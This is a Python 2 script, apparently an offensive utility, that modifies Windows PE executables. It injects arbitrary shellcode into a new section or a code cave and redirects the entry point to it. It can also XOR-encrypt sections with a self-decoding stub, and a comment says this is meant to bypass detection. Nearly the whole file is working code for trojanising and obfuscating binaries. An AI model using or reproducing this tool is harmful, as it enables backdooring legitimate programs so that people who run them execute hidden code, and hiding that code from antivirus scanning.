#!/usr/bin/python
# -*- coding: utf-8 -*-
# Credits:
# http://git.n0p.cc/?p=SectionDoubleP.git;a=blob;f=SectionDoubleP.py
# https://msdn.microsoft.com/en-us/library/ms809762.aspx
#
# TODO
#   - Add function to resume execution (not really working at the moment)
#   - Find code cave to put shellcode into
#   - XOR .text and/or .Xdata sections
#   - Fix prologue (for XOR sections)
import sys
import random
import string
import struct
import os
# Required
try: # Kind of check to ensure all modules are installed
    import pefile
    import argparse
    from pwn import disasm, asm
except:
    print "Please install the following modules to ensure %s works" % (sys.argv[0])
    print " - pefile"
    print " - argparse"
    print " - pwn"
    sys.exit(1)

# Import custom modules/functions
from f_generic import *
from f_pe import *

#####################################################
# Functions
#####################################################

### Add shellcode to binary (either into new section or code cave)
def main_inject_shellcode(pe_struct, shellcode, section_name = None, output_file = None, code_cave=False, verbose = False):
    # Get shellcode content
    shellcode, shellcode_size = open_shellcode_file(shellcode)

    if not code_cave:
        print "\n[*] Adding shellcode into new section (technique 1)"
        # Generate a new section name (if not given by user)
        new_section_name = gen_section_name(section_name)
        # Create a new section
        pe_struct, new_section = create_new_section(pe_struct, sectionName=new_section_name)
        # Verbose
        if (args.verbose):
            iterate_trough_pe_sections(pe_struct)

        offset_address = new_section.VirtualAddress

    else: # Add new section
        print "\n[*] Adding shellcode into code cave (technique 2)"
        # Look for code_cave big enough for shellcode
        result_code_cave = find_code_cave(pe_struct, shellcode_size)
        if len(result_code_cave) == 0:
            print "[!] Can't find a code cave where your shellcode may fit (try with technique 1 or use a shorter shellcode).\nExiting..."
            sys.exit(1)
        else:
            # Let user decide which code cave to use
            code_cave_index = user_choice_int("\nWhich code cave do you want to use? ", "[!] Enter valid index please", len(result_code_cave))
            offset_address, section_name = result_code_cave[code_cave_index]
            # Check if section is executable
            if "x" not in get_section_flags(pe_struct, section_name):
                change_section_flags(pe_struct, section_name)

    # Injecting shellcode (new section)
    inject_shellcode(pe_struct, shellcode, offset_address)
    # Update entry point, to jump to our shellcode
    where_2_jmp = offset_address - pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint - 1
    erase_entry_point = b"\xE9" + p(where_2_jmp)
    update_entry_point(pe_struct, where_2_jmp, erase_entry_point)
    # Write PE file
    write_PE_file(pe_struct, output_file)

### XOR a section to "bypass"
def main_xor(pe_struct, xor_section_name = None, new_section_name = None, output_file = None, verbose = False):
    print "\n[*] Entering XOR section(s) function"
    # Figure out prologue (first few legitimate ASM instructions)
    prologue = figure_prologue(pe_struct, verbose)

    list_sections = []
    # Get sections
    for s in user_given_sections(xor_section_name):
        section, index = find_section(pe_struct, s)
        if section == None:
            print "\n[!] Can't find section name (\"%s\"), use --analyse to see PE's sections\nExiting..." % (s)
            sys.exit(1)
        list_sections.append((section, index))

    # Generate a new section name (if not given by user) & create a new section
    pe_struct, new_section = create_new_section(pe_struct, sectionName=gen_section_name(new_section_name))

    # Verbose - display newly created section
    if (verbose):
        iterate_trough_pe_sections(pe_struct)

    part_xor_routine = ""
    for section, i in list_sections:
        print "\n[*] XORing \"%s\" section" % (section.Name.replace("\x00",""))
        # xor_update_section() will XOR the given section and returns pe_struct and part of xor routine (ASM)
        pe_struct, p_xor_routine = xor_update_section(pe_struct, section)
        # Make section writable
        change_section_flags(pe_struct, ".text")
        # Complete XOR routine
        part_xor_routine += p_xor_routine

    # Add prologue at the end of all XOR routine(s)
    xor_routine, offset_start = xor_add_prologue(prologue, part_xor_routine)

    # Where to jump from Entry Point
    where_2_jmp = new_section.VirtualAddress - pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint - ((offset_start - 5) if (offset_start > 0) else 0) - 5
    # Erase previous instructions @EntryPoint
    erase_entry_point = "\x40" * (offset_start - 5) + "\xE8" + p(where_2_jmp)  # relative JMP (use call to push @ on stack)
    # Change code @ entry point
    update_entry_point(pe_struct, where_2_jmp, erase_entry_point)
    # Update code to add XOR routine
    inject_shellcode(pe_struct, xor_routine, new_section.VirtualAddress)

    if (verbose):
        print "\n[*] Check @EntryPoint and @XOR routine"
        display_ASM_instruction(pe_struct, pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint, 30)
        display_ASM_instruction(pe_struct, new_section.VirtualAddress, len(xor_routine))

    # Write PE file
    write_PE_file(pe_struct, output_file)

#####################################################
# Main
#####################################################
if __name__ == "__main__":
    args = parser()

    # Is verbose ?
    if (args.verbose):
        print "\n[*] Verbose: ON"

    # Load and analyse PE file
    pe_struct = load_pe_file(args.file)
    pe_quick_analysis(pe_struct)

    if (args.analyse): # Look for code cave
        pe_deeper_analysis(pe_struct)
    elif (args.fcc):
        find_code_cave(pe_struct)
    elif (args.xor):
        main_xor(pe_struct, args.xor_sec, args.new_sec_name, args.output, args.verbose)
    elif (args.shellcode):
        main_inject_shellcode(pe_struct, args.shellcode, args.new_sec_name, args.output, args.sh_cc, args.verbose)
    elif (args.test):
        #main_test(pe_struct)
        pass
    print "\n[*] Finished.\nExiting..."
